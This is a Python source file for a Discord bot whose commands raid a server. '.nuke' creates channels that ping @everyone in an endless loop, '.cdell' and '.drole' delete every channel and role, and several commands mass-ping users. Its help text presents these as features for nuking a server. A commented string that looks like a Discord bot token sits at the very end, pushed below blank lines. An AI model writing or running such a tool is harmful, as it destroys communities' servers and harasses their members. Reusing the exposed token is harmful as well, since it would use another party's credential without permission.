import typing
import os
import discord
import discord.ext
import discord.ext.commands
import dotenv

dotenv.load_dotenv()
TOKEN: typing.Final[str] = os.getenv('DISCORD_TOKEN')

intents: discord.Intents = discord.Intents.default()
intents.message_content = True  # noqa
bot = discord.ext.commands.Bot(command_prefix='.', case_insensitive=True, help_command=None, intents=intents)


@bot.event
async def on_ready() -> None:
    print(f'{bot.user} is awake ')


@bot.command()
async def nuke(ctx):
    guild = ctx.message.guild

    while True:
        channels = await guild.create_text_channel('Initiating Nuke...')
        await channels.send(content='@everyone u just got nuked! ')


@bot.command()
async def cdell(ctx):
    try:
        for i in ctx.guild.channels:
            await i.delete()
    except:
        pass


@bot.command()
async def drole(ctx):
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except:
            pass

@bot.command()
async def ping(ctx):
    id = ctx.message.author.id
    try:
        for i in range(10):
            await ctx.message.author.send(f'<@{id}>')

    except Exception as e:
        print(e)

@bot.command()
async def shut(ctx):
    exit()

@bot.command()
async def sspam(message: discord.Message):
    channel = message.channel
    id = message.author.id
    for i in range(10):
        await channel.send(f'<@{id}>')

@bot.command()
async def create(ctx, ChannelName):
    guild = ctx.guild

    embed = discord.Embed(
        title='success',
        description='{} has been successfully created.'.format(ChannelName)
    )

    await guild.create_text_channel(name='{}'.format(ChannelName))
    await ctx.send(embed=embed)

@bot.command()
async def spam(message: discord.Message, user_input : str):
    channel = message.channel

    for i in range(10):
        await channel.send(f'<@{user_input}>')

@bot.command()
async def dele(message: discord.Message):
    channel = message.channel

    await channel.delete()

@bot.command()
async def help(message: discord.Message):
    embed = discord.Embed(
        title='Help\t:person_tipping_hand:',
        description="""
        .nuke: Nuke the server
        
        .cdell: delete every channel in the guild
        
        .drole: delete every role that is below the bot's role
        
        .spam (userid): spam pings a user in the guild by the given user_id
        
        .ping: spam ping yourself in dm
        
        .create (ChannelName): creates a channel
        
        .dele: deletes the channel that the command has been written in"""
        ,
        color=discord.Color.yellow()
    )
    channel = message.channel

    await channel.send(embed=embed)


def main():
    bot.run(TOKEN)


if __name__ == '__main__':
    main()












# MTI1NTE0NzU4Mjg4ODM0OTc3Nw.G7CDuZ.wFNnmN_xpCYw97VI9N2XoDxzOZlm72s3Aiv7PM



